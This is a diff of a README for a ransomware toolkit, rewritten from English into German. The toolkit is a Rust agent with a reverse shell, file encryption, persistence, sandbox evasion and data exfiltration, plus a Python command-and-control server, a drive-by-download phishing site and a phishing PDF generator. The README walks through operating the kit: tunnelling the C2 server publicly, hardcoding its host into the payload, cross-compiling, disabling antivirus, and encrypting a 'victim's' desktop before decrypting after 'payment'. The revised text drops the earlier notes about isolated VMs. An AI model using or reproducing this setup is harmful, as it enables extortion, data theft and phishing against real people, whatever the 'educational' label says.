@@ -18,31 +18,67 @@
 
 ## About the Project
 
-This project demonstrates how a modern ransomware attack works under controlled laboratory conditions. It serves as an educational tool for understanding malware mechanics, encryption techniques, and command-and-control infrastructure.
+Dieses Projekt demonstriert die Funktionsweise einer modernen Ransomware-Attacke unter Laborbedingungen. Es besteht aus folgenden Hauptkomponenten:
 
-### Key Components
+1. **Malware Agent (Rust):** Ein in **Rust** geschriebener Agent, der auf dem Zielsystem ausgeführt wird. Er baut eine Reverse-Shell auf, verschlüsselt Dateien atomar (AES-256-CTR) und etabliert Persistenz.
+2. **C2 Server (Python):** Ein Command-and-Control Server, der mehrere Bots verwaltet, Befehle sendet und die Entschlüsselung steuert.
+3. **Delivery Server (DbD-Site):** Ein Webserver, der Drive-by-Download Angriffe simuliert und OS-spezifische Payloads ausliefert.
+4. **PDF Phishing:** Ein Generator für Phishing-PDFs, die das Opfer zum Download der Malware verleiten.
 
-| Component | Language | Description |
-|-----------|----------|-------------|
-| **Malware Agent** | Rust | Cross-platform agent with encryption, persistence, and evasion capabilities |
-| **C2 Server** | Python | Multi-client command-and-control server for bot management |
-| **Delivery System** | Python/HTML | Phishing website and PDF-based payload delivery |
+Ziel ist es die Funktionsweise von Ransomware zu erklären und zu demonstrieren.
+
+---
+
+## Projektstruktur
+
+```
+rust-mw/
+├── malware_agent/          # Rust Ransomware Agent
+│   └── src/
+├── c2_server/              # Python C2 Server
+│   ├── server.py
+│   └── loot/               # Exfiltrierte Daten
+├── delivery/
+│   ├── DbD-Site/           # Drive-by-Download Webserver
+│   │   ├── server.py
+│   │   ├── public/         # HTML/CSS Phishing-Seiten
+│   │   └── files/          # Payloads (werden durch build generiert)
+│   └── pdf_phishing/       # PDF Generator
+├── build_payloads.sh       # Kompiliert alle Payloads
+├── run_c2.sh               # Startet C2 Server
+├── run_delivery.sh         # Startet Delivery Server
+└── run_pinggy.sh           # Startet Pinggy Tunnel
+```
 
 ---
 
 ## Features
 
-- **AES-256-CTR Encryption** – Atomic file encryption with streaming to prevent data corruption
-- **Cross-Platform Support** – Runs on Linux, Windows, and macOS
-- **Reverse Shell** – Bypasses firewalls by initiating outbound connections
-- **Persistence Mechanisms**:
-  - Windows: Registry autostart (`HKCU\...\Run`)
-  - Linux: Systemd user service
-  - macOS: LaunchAgent
-- **Evasion Techniques** – Sandbox/VM detection via RAM and CPU core checks
-- **Stealth Mode** – Hidden console on Windows, daemon mode on Linux
-- **Data Exfiltration** – Automated file upload to C2 server
-- **Phishing Toolkit** – Includes fake website and malicious PDF generator
+### 1. Angriffskette (Attack Chain)
+
+```mermaid
+graph LR
+    subgraph Delivery [1. Delivery Phase]
+        PDF[Phishing PDF]
+        DbD[Drive-by-Download Site]
+    end
+
+    subgraph Infection [2. Infektion]
+        Payload[Rust Payload]
+    end
+
+    subgraph C2 [3. Command & Control]
+        Server[C2 Server]
+        Tunnel[Pinggy Tunnel]
+    end
+
+    PDF --> |"Klick auf Link"| DbD
+    DbD --> |"OS-Detection"| Payload
+    Payload --> |"Reverse Shell"| Tunnel
+    Tunnel --> Server
+```
+
+### 2. Netzwerk-Kommunikation (Reverse Shell)
 
 ---
 
@@ -73,9 +109,8 @@ graph LR
     Server -. "4. Commands (encrypt/decrypt)" .-> Client
 ```
 
-### Atomic Encryption Process
-
-To prevent data loss during crashes, the agent uses an atomic write procedure.
+### 3. Verschlüsselungsprozess (Atomic Encryption)
+   Um Datenverlust bei Abstürzen zu verhindern, nutzt der Agent ein atomares Verfahren.
 
 ```mermaid
 sequenceDiagram
@@ -95,18 +130,41 @@ sequenceDiagram
 
 ---
 
+## Quick Start (Automatisierte Skripte)
+
+Das Projekt enthält Shell-Skripte für einen vereinfachten Workflow:
+
+```bash
+# Terminal 1: Pinggy Tunnel starten (notiere Host & Port!)
+./run_pinggy.sh
+
+# Terminal 2: C2 Server starten
+./run_c2.sh
+
+# Terminal 3: Payloads kompilieren (nach Pinggy-Konfiguration!)
+./build_payloads.sh
+
+# Terminal 4: Delivery Server starten (optional)
+./run_delivery.sh
+```
+
+### Workflow-Reihenfolge
+
+1. **`./run_pinggy.sh`** - Startet TCP-Tunnel, gibt Host & Port aus
+2. Konfiguriere `malware_agent/src/main.rs` mit den Pinggy-Daten
+3. **`./build_payloads.sh`** - Kompiliert für Linux/Windows/Mac
+4. **`./run_c2.sh`** - Startet den Command-and-Control Server
+5. **`./run_delivery.sh`** - Startet den Drive-by-Download Server
+
+---
+
+## Manuelle Installation & Start
+
+### C2 Server (Angreifer)
+
 ## Getting Started
 
-### Prerequisites
-
-- **Rust** (1.70+) – [Install Rust](https://rustup.rs/)
-- **Python** (3.8+) – Standard library only, no pip packages required
-- **SSH client** – For tunneling (Pinggy.io)
-- **Isolated VM** – Required for testing
-
-### Quick Start
-
-#### 1. Start the C2 Server
+1. **Server lokal starten**
 
 ```bash
 cd c2_server
@@ -115,203 +173,183 @@ python3 server.py
 
 The server listens on port **4444** by default.
 
-#### 2. Create Public Tunnel (Pinggy.io)
+2. **Server öffentlich verfügbar machen (Pinggy.io)**
 
-In a **separate terminal**, create a public tunnel:
+Damit sich der Client aus einem anderen Netzwerk (oder VM) verbinden kann, wird ein öffentlicher Tunnel verwendet.
 
 ```bash
-ssh -p 443 -R0:localhost:4444 tcp@a.pinggy.io
+# Startet einen TCP Tunnel zu Ihrem lokalen Port 4444
+ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -p 443 -R0:localhost:4444 tcp@a.pinggy.io
 ```
 
-Note the output URL and port:
+**Notieren der Ausgabe!** Sie sieht etwa so aus:
 ```
-tcp://example-12-34-56-78.a.free.pinggy.link:39005
-Host: example-12-34-56-78.a.free.pinggy.link
+tcp://ylruu-90-186-43-205.a.free.pinggy.link:39005
+Host: ylruu-90-186-43-205.a.free.pinggy.link
 Port: 39005
 ```
 
-> Keep this terminal open – closing it breaks the connection.
+> **Hinweis:** Lassen Sie dieses Terminal offen, sonst bricht die Verbindung ab.
 
-#### 3. Configure & Build the Agent
+---
+
+### Delivery Server (Drive-by-Download)
+
+Der Delivery Server simuliert Phishing-Webseiten und liefert OS-spezifische Payloads aus.
+
+1. **Server starten**
+
+```bash
+cd delivery/DbD-Site
+python3 server.py
+```
+
+Der Server läuft auf Port 3000 und bietet folgende Endpunkte:
+- `/game` - Fake Gaming Seite
+- `/security` - Fake Security Alert
+- `/prize` - Fake Gewinnspiel
+- `/get_document` - Smart Download (erkennt OS automatisch)
+
+2. **Phishing PDF generieren**
+
+```bash
+cd delivery/pdf_phishing
+pip install -r requirements.txt
+python3 generate_phishing_pdf.py
+```
+
+Das PDF enthält einen unscharfen "Rechnungs-Hintergrund" mit einem Link, der das Opfer zum Delivery Server führt.
+
+---
+
+## Malware Agent Kompilierung (Opfer)
 
 Edit `malware_agent/src/main.rs` with your tunnel details:
 
-```rust
-const C2_IP: &str = "example-12-34-56-78.a.free.pinggy.link";
+### 1. Konfiguration anpassen
+
+Öffnen Sie die Datei `malware_agent/src/main.rs` und tragen Sie die Daten aus dem Pinggy-Tunnel ein:
+
+```Rust
+// src/main.rs
+
+// Tragen Sie hier die URL von Pinggy ein (OHNE tcp://)
+const C2_IP: &str = "ylruu-90-186-43-205.a.free.pinggy.link";
+
+// Tragen Sie hier den Port von Pinggy ein
 const C2_PORT: u16 = 39005;
 ```
 
-Build the release binary:
+### 2. Kompilieren (Build)
 
+**Option A: Automatisch (empfohlen)**
+```bash
+./build_payloads.sh
+```
+Dieses Skript kompiliert für Linux, Windows und Mac und kopiert die Payloads automatisch in den Delivery-Ordner.
+
+**Option B: Manuell**
 ```bash
 cd malware_agent
 cargo build --release
 ```
 
-**Output locations:**
-- Linux/macOS: `./target/release/rust-mw`
-- Windows: `.\target\release\rust-mw.exe`
+### 3. Die Executable finden
 
-#### 4. Cross-Compile for Windows (from Linux)
+Nach dem Kompilieren finden Sie die ausführbare Datei hier:
+- Linux/Mac: `./target/release/rust_mw`
+- Windows: `.\target\release\rust_mw.exe`
 
-```bash
-rustup target add x86_64-pc-windows-gnu
-cargo build --release --target x86_64-pc-windows-gnu
-```
+> **Achtung:** Windows Defender oder Antiviren-Programme werden diese Datei wahrscheinlich sofort löschen. Fügen Sie den Ordner zu den Ausnahmen hinzu oder deaktivieren Sie den Echtzeitschutz für die Demo.
 
-### Automated Build Script
-
-Use the included build script to compile for all platforms and generate phishing payloads:
+### 4. Cross-Compilation
 
 ```bash
-./build_payloads.sh
+# Von Linux für Windows kompilieren
+cd malware_agent
+RUSTFLAGS="-C link-args=-static" cargo build --release --target x86_64-pc-windows-gnu
 ```
-
-This creates payloads in `delivery/DbD-Site/files/`.
 
 ---
 
-## C2 Server Commands
+## Bedienung des C2 Servers
 
-Once a victim executes the payload, you'll see:
+Sobald das Opfer die Payload ausführt, erscheint im Server-Terminal:
 
-```
-[+] New connection: ID 1 from ...
-```
+`[+] Neue Verbindung: ID 1 from ...`
 
-### Available Commands
+Der Server verfügt über eine interaktive Shell. Hier sind die wichtigsten Befehle:
 
-| Command | Description |
-|---------|-------------|
-| `sessions` | List all connected bots |
-| `interact <ID>` | Enter interactive mode with a specific bot |
-| `encrypt <ID> <PATH>` | Encrypt a folder on the victim's system |
-| `decrypt <ID> [PATH]` | Decrypt files (defaults to root directory) |
-| `broadcast <CMD>` | Send command to all connected bots |
-| `help` | Display help menu |
-| `exit` | Shut down the server |
+| Befehl | Beschreibung |
+|--------|--------------|
+| `sessions` | Listet alle aktuell verbundenen Opfer (Bots) auf |
+| `interact <ID>` | Wechselt in den Modus, um einen spezifischen Bot zu steuern |
+| `encrypt <ID> <PFAD>` | Verschlüsselt einen Ordner auf dem PC des Opfers |
+| `decrypt <ID> [PFAD]` | Entschlüsselt Dateien. Ohne Pfad wird das Root-Verzeichnis genommen |
+| `broadcast <CMD>` | Sendet einen Befehl an alle verbundenen Bots gleichzeitig |
+| `help` | Zeigt das Hilfemenü an |
+| `exit` | Beendet den Server |
 
-### Example Workflow
+### Beispiel-Workflow
 
 ```bash
-# Check connections
+# Verbindungen prüfen
 C2> sessions
 
-# Interact with victim 1
+# Mit Opfer 1 interagieren
 C2> interact 1
 
-# Start encryption on desktop
+# Verschlüsselung starten (auf dem Desktop)
 ID 1> encrypt /home/user/Desktop
 
-# Decrypt after "payment"
+# (Der Client generiert Schlüssel, verschlüsselt Dateien und zeigt die Erpresser-Nachricht)
+
+# Entschlüsselung starten (nach "Zahlung")
 ID 1> decrypt
 
-# Return to main menu
+# Zurück zum Hauptmenü
 ID 1> background
 ```
 
 ---
 
-## Project Structure
+## Prozess-Management
 
-```
-rust-mw/
-├── malware_agent/           # Rust malware agent
-│   ├── src/
-│   │   ├── main.rs          # Entry point & C2 configuration
-│   │   ├── crypto.rs        # AES-256-CTR encryption
-│   │   ├── persistence.rs   # Autostart mechanisms
-│   │   ├── evasion.rs       # VM/Sandbox detection
-│   │   ├── network.rs       # C2 communication
-│   │   ├── extortion.rs     # Ransom note generation
-│   │   └── background.rs    # Daemon/stealth mode
-│   └── Cargo.toml
-├── c2_server/               # Python C2 server
-│   ├── server.py            # Multi-threaded server
-│   └── loot/                # Exfiltrated files
-├── delivery/                # Payload delivery
-│   ├── DbD-Site/            # Phishing website
-│   │   ├── server.py
-│   │   └── public/          # HTML/CSS files
-│   └── pdf_phishing/        # Malicious PDF generator
-├── build_payloads.sh        # Automated build script
-├── run_c2.sh                # C2 server launcher
-├── run_delivery.sh          # Delivery server launcher
-└── run_pinggy.sh            # Tunnel launcher
+Um den Malware-Prozess auf dem Opfer-System zu beenden:
+
+```bash
+# Prozess finden
+pgrep -a rust
+
+# Prozess beenden
+pkill -f rust
 ```
 
 ---
 
-## Technical Details
+## Technische Features
 
-### Encryption
+### Malware Agent
+- **Stealth Mode:** Unter Windows wird das Konsolenfenster versteckt (`windows_subsystem`). Unter Linux läuft der Prozess als Daemon im Hintergrund.
+- **Persistenz:**
+  - Windows: Registry Key (`HKCU\...\Run`)
+  - Linux: Systemd Service (`~/.config/systemd/user/`)
+- **Krypto:** AES-256-CTR via RustCrypto Crate. Der Key wird lokal in `rescue.key` gespeichert.
+- **Daten-Exfiltration:** Gestohlene Dateien werden Base64-kodiert zum C2 Server übertragen.
+- **Wallpaper-Änderung:** Nach der Verschlüsselung wird das Desktop-Hintergrundbild durch ein Ransomware-Bild ersetzt:
+  - Das Bild (`ransom_wallpaper.jpg`) ist in die Binary eingebettet (`include_bytes!`)
+  - Wird automatisch nach `base_path` extrahiert und als Wallpaper gesetzt
+  - Nutzt die `wallpaper` Crate für plattformübergreifende Unterstützung
+- **Ransom Note:** HTML-Datei (`README_DECRYPT.html`) wird erstellt und automatisch im Browser geöffnet
 
-- **Algorithm:** AES-256-CTR (via RustCrypto)
-- **Key Storage:** `rescue.key` saved locally (in production, this would be sent to C2)
-- **Process:** Streaming encryption with 4KB chunks for memory efficiency
+### Delivery Server
+- **OS-Detection:** Erkennt automatisch Windows/Linux/Mac anhand des User-Agents
+- **Phishing-Seiten:** Vorgefertigte Social Engineering Templates (Game, Security, Prize)
+- **Smart Download:** Endpoint `/get_document` liefert passende Payload basierend auf OS
 
-### Persistence
-
-| OS | Method |
-|----|--------|
-| Windows | Registry key `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` |
-| Linux | Systemd user service `~/.config/systemd/user/malware.service` |
-| macOS | LaunchAgent `~/Library/LaunchAgents/` |
-
-### Evasion
-
-The agent detects sandboxes/VMs by checking:
-- Available RAM (< 2GB = suspicious)
-- CPU core count (< 2 = suspicious)
-
----
-
-## Dependencies
-
-### Rust Agent (`malware_agent/Cargo.toml`)
-
-- `aes`, `ctr`, `cipher` – AES-256-CTR encryption
-- `walkdir` – Directory traversal
-- `dirs` – Cross-platform directory detection
-- `sysinfo` – System information for evasion
-- `daemonize` – Unix daemon mode
-- `chrono` – Timestamp handling
-- `anyhow` – Error handling
-
-### C2 Server
-
-- Python 3.8+ standard library only (no external dependencies)
-
----
-
-## Security Notes
-
-1. **Antivirus Warning:** Windows Defender and other AV software will likely flag/delete the payload. Add an exception or disable real-time protection for testing.
-
-2. **Network Isolation:** Always test in an isolated network environment.
-
-3. **VM Snapshots:** Take a VM snapshot before running the malware.
-
----
-
-## Educational Resources
-
-This project covers concepts including:
-- Reverse shell architecture
-- Symmetric encryption (AES-CTR mode)
-- Persistence techniques across operating systems
-- Sandbox/VM evasion methods
-- Command-and-control infrastructure
-- Social engineering (phishing)
-
----
-
-## Contributing
-
-Contributions for educational improvements are welcome. Please ensure any changes:
-- Maintain the educational focus
-- Include documentation
-- Do not add features designed for malicious use
+### PDF Phishing
+- **Blurred Invoice:** Generiert ein unscharfes Rechnungsbild als Köder
+- **Embedded Link:** Verlinkt auf den Delivery Server zum Download der Payload
 
 ---
 
